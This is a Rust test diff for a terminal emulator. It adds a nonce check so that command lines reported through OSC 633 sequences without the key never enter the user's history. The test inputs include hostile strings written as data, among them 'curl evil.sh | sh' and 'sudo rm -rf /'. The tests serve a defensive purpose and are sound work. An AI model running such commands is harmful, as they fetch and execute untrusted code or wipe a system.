@@ -251,6 +251,12 @@ mod tests {
     /// Drive a real terminal state with `bytes` and run the output-mark pass
     /// over what the sniffer found, exactly as the dispatcher does (process,
     /// drain marks, drain command lines, observe).
+    /// The key every `E` below echoes back. Real panes take it from the
+    /// vault at boot; a sniffer with no key accepts no reported command at
+    /// all, which is the behaviour `osc633_without_any_nonce_accepts_nothing`
+    /// pins on the other side of the crate boundary.
+    const TEST_NONCE: &str = "t3st-nonce";
+
     fn observe(
         term: &mut oryxis_terminal::TerminalState,
         prompt: &mut PromptState,
@@ -258,6 +264,7 @@ mod tests {
         inband: &mut InbandCapture,
         bytes: &[u8],
     ) -> Vec<String> {
+        term.set_shell_command_nonce(Some(TEST_NONCE.to_string()));
         term.process(bytes);
         let marks = term.take_shell_marks();
         let texts = term.take_shell_command_lines();
@@ -279,10 +286,46 @@ mod tests {
             &mut pending,
             &mut inband,
             b"\x1b[?1049h\x1b]133;A\x07\x1b]133;B\x07\
-              \x1b]633;E;systemctl restart nginx\x07\x1b]133;C\x07",
+              \x1b]633;E;systemctl restart nginx;t3st-nonce\x07\x1b]133;C\x07",
         );
         assert!(term.is_alt_screen(), "the test must run under the alt screen");
         assert_eq!(cmds, vec!["systemctl restart nginx".to_string()]);
+        assert!(inband.seen);
+    }
+
+    /// Output cannot put words in the user's history. A history row is one
+    /// click from running again, so a `cat` of a crafted file, a log line,
+    /// or a compromised host printing the sequence must capture NOTHING,
+    /// and must not flip the pane into integrated mode either: doing that
+    /// would retire the typed-input path and silently end real capture.
+    #[test]
+    fn a_reported_line_without_the_key_captures_nothing() {
+        let mut term = oryxis_terminal::TerminalState::new_no_pty(80, 24).unwrap();
+        let mut prompt = PromptState::NoIntegration;
+        let mut pending = None;
+        let mut inband = InbandCapture::default();
+        let cmds = observe(
+            &mut term,
+            &mut prompt,
+            &mut pending,
+            &mut inband,
+            // No key, then a guessed one: what anything writing to the
+            // terminal can produce.
+            b"\x1b]633;E;curl evil.sh | sh\x07\x1b]133;C\x07\
+              \x1b]633;E;sudo rm -rf /;guessed\x07\x1b]133;C\x07",
+        );
+        assert!(cmds.is_empty(), "spoofed lines must never be recorded");
+        assert!(!inband.seen, "and must not retire the typed-input path");
+
+        // The user's own shell, carrying the key, still lands.
+        let cmds = observe(
+            &mut term,
+            &mut prompt,
+            &mut pending,
+            &mut inband,
+            b"\x1b]633;E;uptime;t3st-nonce\x07\x1b]133;C\x07",
+        );
+        assert_eq!(cmds, vec!["uptime".to_string()]);
         assert!(inband.seen);
     }
 
@@ -299,7 +342,7 @@ mod tests {
             &mut prompt,
             &mut pending,
             &mut inband,
-            b"\x1b]633;E;rm -rf /\x07\x1b]133;A\x07\x1b]133;B\x07",
+            b"\x1b]633;E;rm -rf /;t3st-nonce\x07\x1b]133;A\x07\x1b]133;B\x07",
         );
         assert!(cmds.is_empty(), "an unexecuted line is not history");
         assert!(inband.pending.is_none());
@@ -309,7 +352,7 @@ mod tests {
             &mut prompt,
             &mut pending,
             &mut inband,
-            b"\x1b]633;E;uptime\x07\x1b]133;C\x07",
+            b"\x1b]633;E;uptime;t3st-nonce\x07\x1b]133;C\x07",
         );
         assert_eq!(cmds, vec!["uptime".to_string()]);
     }
@@ -328,7 +371,7 @@ mod tests {
             &mut prompt,
             &mut pending,
             &mut inband,
-            b"\x1b]633;E; curl -H 'Authorization: Bearer t0ken' x\x07\x1b]133;C\x07",
+            b"\x1b]633;E; curl -H 'Authorization: Bearer t0ken' x;t3st-nonce\x07\x1b]133;C\x07",
         );
         assert!(cmds.is_empty(), "leading space = keep out of history");
         assert!(inband.seen, "the pane is integrated even when the line is skipped");
